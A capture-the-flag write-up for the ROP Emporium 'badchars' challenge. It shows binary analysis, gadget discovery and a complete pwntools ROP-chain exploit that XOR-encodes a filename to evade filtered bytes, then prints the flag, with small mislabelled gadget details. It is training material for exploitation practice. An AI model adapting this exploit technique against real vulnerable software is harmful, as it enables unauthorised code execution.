# badchars Writeup

## Steps:
1. Run badchars. Similar to the previous problem, our general plan is to write to memory then call `print_file()` with `flag.txt` as the argument, but we cannot write `x g a .`
```
$ ./badchars
badchars by ROP Emporium
x86_64

badchars are: 'x', 'g', 'a', '.'
> AAAA
Thank you!
```

2. Analyze in ghidra.

Notice function `usefulFunction` is the same as write4
```
void usefulFunction(void)

{
  print_file("nonexistent");
  return;
}
```
We identify the address of `print_file` to be `0x400510`
```
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk undefined print_file()
                               Thunked-Function: <EXTERNAL>::print_file
             undefined         <UNASSIGNED>   <RETURN>
                             <EXTERNAL>::print_file                          XREF[1]:     print_file:00400510(T), 
                                                                                          print_file:00400510(c)  
        00602018                 ??         ??

```
3. Determine where to write the string - below we see that the `.data` and `.bss` sections have read and write permissions
```
$ rabin2 -Sg badchars 
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
ERROR: Missing bin header dwarf
[Sections]

nth paddr        size vaddr       vsize perm type        name
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000    0x0 0x00000000    0x0 ---- NULL
1   0x00000238   0x1c 0x00400238   0x1c -r-- PROGBITS    .interp
2   0x00000254   0x20 0x00400254   0x20 -r-- NOTE        .note.ABI-tag
3   0x00000274   0x24 0x00400274   0x24 -r-- NOTE        .note.gnu.build-id
4   0x00000298   0x38 0x00400298   0x38 -r-- GNU_HASH    .gnu.hash
5   0x000002d0   0xf0 0x004002d0   0xf0 -r-- DYNSYM      .dynsym
6   0x000003c0   0x7e 0x004003c0   0x7e -r-- STRTAB      .dynstr
7   0x0000043e   0x14 0x0040043e   0x14 -r-- GNU_VERSYM  .gnu.version
8   0x00000458   0x20 0x00400458   0x20 -r-- GNU_VERNEED .gnu.version_r
9   0x00000478   0x30 0x00400478   0x30 -r-- RELA        .rela.dyn
10  0x000004a8   0x30 0x004004a8   0x30 -r-- RELA        .rela.plt
11  0x000004d8   0x17 0x004004d8   0x17 -r-x PROGBITS    .init
12  0x000004f0   0x30 0x004004f0   0x30 -r-x PROGBITS    .plt
13  0x00000520  0x192 0x00400520  0x192 -r-x PROGBITS    .text
14  0x000006b4    0x9 0x004006b4    0x9 -r-x PROGBITS    .fini
15  0x000006c0   0x10 0x004006c0   0x10 -r-- PROGBITS    .rodata
16  0x000006d0   0x44 0x004006d0   0x44 -r-- PROGBITS    .eh_frame_hdr
17  0x00000718  0x120 0x00400718  0x120 -r-- PROGBITS    .eh_frame
18  0x00000df0    0x8 0x00600df0    0x8 -rw- INIT_ARRAY  .init_array
19  0x00000df8    0x8 0x00600df8    0x8 -rw- FINI_ARRAY  .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- DYNAMIC     .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- PROGBITS    .got
22  0x00001000   0x28 0x00601000   0x28 -rw- PROGBITS    .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- PROGBITS    .data
24  0x00001038    0x0 0x00601038    0x8 -rw- NOBITS      .bss
25  0x00001038   0x29 0x00000000   0x29 ---- PROGBITS    .comment
26  0x00001068  0x618 0x00000000  0x618 ---- SYMTAB      .symtab
27  0x00001680  0x1f8 0x00000000  0x1f8 ---- STRTAB      .strtab
28  0x00001878  0x103 0x00000000  0x103 ---- STRTAB      .shstrtab
```

4. Like write4, look for a `mov [reg], reg` to write somewhere in memory and a way to `pop` into the registers it uses. And, we will need a `pop rdi` to send the argument to the `print_file` function. In addition, we need a `xor` to change the string in memory.
>rdi:    First Argument
>
>rsi:    Second Argument
>
>rdx:    Third Argument
>
```
$ ROPgadget --binary write4 | grep 'mov'
0x0000000000400634 : mov qword ptr [r13], r12 ; ret

$ ROPgadget --binary write4 | grep 'pop'
0x000000000040069b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006a3 : pop rdi ; ret

$ ROPgadget --binary badchars | grep 'xor' 
0x0000000000400628 : xor byte ptr [r15], r14b ; ret
```
5. Write a function to xor all the characters in `flag.txt`. We will also have to undo this after it is placed in memory.
6. Create the payload:
   - 40 bytes of garbage
   - pop string (after xor-ing it), address of bss into r12 and r13
   - mov [r15], r14
   - in a loop, xor each element of the string in bss
     + pop key, bss into r14 and r15
     + xor [r15], r14
   - pop addr of bss into rdi
   - call print_file
```
from pwn import *


badchars = ['x','g','a','.']

def xor_string(string, key):
    xored = []
    for s in string:
        char = chr(ord(s) ^ key)
        xored.append(char)
    return ''.join(xored)

key = 2
xored = xor_string("flag.txt", key)



p = process('./badchars')

payload = b"A" * 40


pops = 0x40069c
mov = 0x400634
xor = 0x400628
pop = 0x4006a3

pwnme = 0x400500
print_file = 0x400510
bss = 0x601038

x = 0xdeadc0dedeadc0de

# write XORed data
payload = b"A" * 40
payload += p64(pops) + xored.encode() + p64(bss) + p64(x) + p64(x)
payload += p64(mov)

# Inverse XORed data
for i in range(8): 
    payload += p64(pops) + p64(x) + p64(x) + p64(key) + p64(bss + i)
    payload += p64(xor)

# Call print_file
payload += p64(pop)
payload += p64(bss)
payload += p64(print_file)

p.sendline(payload)

print(p.recvall().decode())
```

## Solution:
```
$ python3 exploit.py
[+] Starting local process './badchars': pid 21692
[+] Receiving all data: Done (112B)
[*] Process './badchars' stopped with exit code -11 (SIGSEGV) (pid 21692)
badchars by ROP Emporium
x86_64

badchars are: 'x', 'g', 'a', '.'
> Thank you!
ROPE{a_placeholder_32byte_flag!}
```
                            
